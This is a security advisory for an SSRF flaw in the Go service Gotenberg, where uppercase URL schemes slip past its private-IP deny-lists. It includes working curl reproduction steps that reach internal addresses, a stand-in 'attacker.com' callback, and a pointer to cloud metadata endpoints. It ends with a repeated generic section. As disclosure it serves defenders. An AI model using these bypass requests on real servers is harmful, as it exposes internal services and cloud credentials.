# [H] Gotenberg has case-insensitive URL scheme that bypasses webhook and downloadFrom deny-list SSRF protection

## Summary
Severity: High
Advisory: GHSA-5q7p-7jgv-ww56
CVE: CVE-2026-40280
CWE: CWE-918
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N (CVSS_V3)
Published: 2026-04-30
Source: https://github.com/advisories/GHSA-5q7p-7jgv-ww56
Type: github-advisory

## Affected
- Go: `github.com/gotenberg/gotenberg/v8` — affected >=0 <8.31.0

## Details
## Vulnerability Details

**CWE**: CWE-918 - Server-Side Request Forgery (SSRF)

The default private-IP deny-lists for --webhook-deny-list and --api-download-from-deny-list use a case-sensitive regex (^https?://). Any uppercase URL scheme variant (HTTP://, HTTPS://, Http://) bypasses the pattern. Go's net/url.Parse() normalizes the scheme to lowercase when making the outbound TCP connection, so the connection succeeds normally. Affected: pkg/gotenberg/filter.go:FilterDeadline(), pkg/modules/webhook/webhook.go:42, pkg/modules/api/api.go:199. Confirmed in Docker: http://172.17.0.1:12345/ returns HTTP 403 (blocked), HTTP://172.17.0.1:12345/ returns HTTP 202 (bypassed, TCP connection attempted). Same pattern as CVE-2026-27018/GHSA-jjwv-57xh-xr6r but in newly added webhook+downloadFrom deny-lists (commit 3f01ca1, 2026-04-07). Affected versions: <= 8.30.1. CVSS: AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N = 9.1.

## Summary

The default private-IP deny-lists for `--webhook-deny-list` and `--api-download-from-deny-list` use a case-sensitive regex (`^https?://`). Any uppercase URL scheme variant (`HTTP://`, `HTTPS://`, `Http://`) bypasses the pattern. Go's `net/url.Parse()` normalizes the scheme to lowercase when making the outbound TCP connection, so the connection succeeds normally.

The same bypass (case-insensitive scheme) was previously reported for the Chromium deny-list in CVE-2026-27018 (GHSA-jjwv-57xh-xr6r), but the newly added deny-lists for webhook and downloadFrom contain the identical flaw.

**Affected file/function**: `pkg/gotenberg/filter.go:FilterDeadline()`, `pkg/modules/webhook/webhook.go:42` (default regex), `pkg/modules/api/api.go:199` (default regex)

## Steps to Reproduce

```
1. Start Gotenberg:
   docker run --rm -d -p 3001:3000 --name gotenberg-test gotenberg/gotenberg:8

2. Baseline — lowercase http:// is blocked (HTTP 403):
   curl -s -w "\nHTTP %{http_code}" -X POST http://localhost:3001/forms/chromium/convert/url \
     -H "Gotenberg-Webhook-Url: http://172.17.0.1:12345/callback" \
     -H "Gotenberg-Webhook-Events-Url: http://attacker.com/events" \
     -F "url=https://example.com/"

3. Bypass — uppercase HTTP:// bypasses deny-list (HTTP 202, connection attempted):
   curl -s -w "\nHTTP %{http_code}" -X POST http://localhost:3001/forms/chromium/convert/url \
     -H "Gotenberg-Webhook-Url: HTTP://172.17.0.1:12345/callback" \
     -H "Gotenberg-Webhook-Events-Url: http://attacker.com/events" \
     -F "url=https://example.com/"
   # Returns 202 + Gotenberg logs: "Post \"http://172.17.0.1:12345/callback\": connection refused"

4. downloadFrom bypass (response content included in PDF):
   curl -s -w "\nHTTP %{http_code}" http://localhost:3001/forms/chromium/convert/html \
     -F 'files=@/dev/stdin;filename=index.html;type=text/html' \
     -F 'downloadFrom=[{"url":"HTTP://172.17.0.1:12345/secret.html"}]' <<< '<html><body>test</body></html>'
   # Error is "Unable to download file" (connection refused), not "filter URL" — bypass confirmed
```

## Impact

An unauthenticated attacker can access internal network services (private IP ranges, loopback, link-local) that the deny-list was designed to block. The `downloadFrom` SSRF can exfiltrate content from internal services that respond with `Content-Disposition` headers. In cloud environments, this could allow access to instance metadata services (e.g., `HTTP://169.254.169.254/latest/meta-data/`). This bypasses the same security control that was patched in CVE-2026-27018.

## Fix

Normalize the URL scheme to lowercase before passing to `FilterDeadline`, or compile deny-list regexes with the case-insensitive flag (`(?i)`).

### Vulnerable Code

```go
// See description for details
```

## Steps to Reproduce

1. Set up the application using the default configuration
2. See the vulnerability details above


## Impact

This vulnerability may allow an attacker to compromise the application.

## References
- https://github.com/gotenberg/gotenberg/security/advisories/GHSA-5q7p-7jgv-ww56
- https://nvd.nist.gov/vuln/detail/CVE-2026-40280
- https://github.com/gotenberg/gotenberg/commit/3f01ca18d3cc21375a1e2da4b5a3f261c8548e47
- https://github.com/advisories/GHSA-jjwv-57xh-xr6r
- https://github.com/gotenberg/gotenberg
- https://github.com/gotenberg/gotenberg/releases/tag/v8.31.0
